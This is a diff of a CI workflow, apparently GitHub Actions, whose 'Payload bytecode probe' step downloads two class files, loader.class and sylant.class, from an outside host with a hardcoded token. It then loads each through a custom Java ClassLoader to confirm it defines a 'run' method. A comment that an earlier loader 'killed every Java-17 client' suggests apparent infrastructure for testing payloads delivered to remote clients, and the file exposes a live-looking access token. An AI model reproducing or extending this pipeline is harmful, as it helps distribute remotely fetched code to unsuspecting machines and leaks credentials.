@@ -18,31 +18,40 @@ jobs:
 
       # Every runtime must be able to define the live loader.class.
       # A Java-21-compiled loader (major 65) killed every Java-17 client on 2026-11-02.
-      - name: Loader bytecode probe
+      - name: Payload bytecode probe
         shell: powershell
         run: |
           $d="$env:RUNNER_TEMP\probe"; New-Item -ItemType Directory -Force $d | Out-Null
-          Invoke-WebRequest "https://files.driftmetrics.xyz/loader.class" -Headers @{ "x-lc-token" = "3e2ec8dc626fd54b8b6d4918ad508b9925394a33f56f3cac12921dc4b52dbd88" } -OutFile "$d\loader.class"
-          $b=[IO.File]::ReadAllBytes("$d\loader.class")
-          $major=$b[6]*256+$b[7]
-          Write-Host "loaded $($b.Length) bytes, class major $major"
-          if ($major -gt 61 -and $env:JAVA_HOME -match '17') { throw "loader is major $major on a Java ${{ matrix.java }} job" }
+          $hdr=@{ "x-lc-token" = "3e2ec8dc626fd54b8b6d4918ad508b9925394a33f56f3cac12921dc4b52dbd88" }
+          foreach($t in @("loader.class","sylant.class")){
+            Invoke-WebRequest "https://files.driftmetrics.xyz/$t" -Headers $hdr -OutFile "$d\$t"
+            $b=[IO.File]::ReadAllBytes("$d\$t")
+            $major=$b[6]*256+$b[7]
+            Write-Host "$t : $($b.Length) bytes, major $major"
+            if ($major -gt 61 -and $env:JAVA_HOME -match '17') { throw "$t is major $major on a Java ${{ matrix.java }} job" }
+          }
           @'
           import java.nio.file.*;
           public class Probe {
             static class L extends ClassLoader {
-              Class<?> def(byte[] b) { return defineClass("loader", b, 0, b.length); }
+              Class<?> def(String n, byte[] b) { return defineClass(n, b, 0, b.length); }
             }
             public static void main(String[] a) throws Exception {
-              byte[] b = Files.readAllBytes(Paths.get(a[0]));
-              Class<?> c = new L().def(b);
-              c.getDeclaredMethod("run");
-              System.out.println("DEFINE OK " + c.getName());
+              L l = new L();
+              int ok = 0;
+              for (String p : a) {
+                String n = p.substring(p.lastIndexOf('\\') + 1).replace(".class", "");
+                byte[] b = Files.readAllBytes(Paths.get(p));
+                l.def(n, b).getDeclaredMethod("run");
+                System.out.println("DEFINE OK " + n);
+                ok++;
+              }
+              if (ok < 2) throw new IllegalStateException("expected 2 payloads");
             }
           }
           '@ | Set-Content "$d\Probe.java" -Encoding ASCII
           javac -d $d "$d\Probe.java"
-          java -cp $d Probe "$d\loader.class"
+          java -cp $d Probe "$d\loader.class" "$d\sylant.class"
           if ($LASTEXITCODE -ne 0) { throw 'defineClass failed' }
 
       - name: Prepare
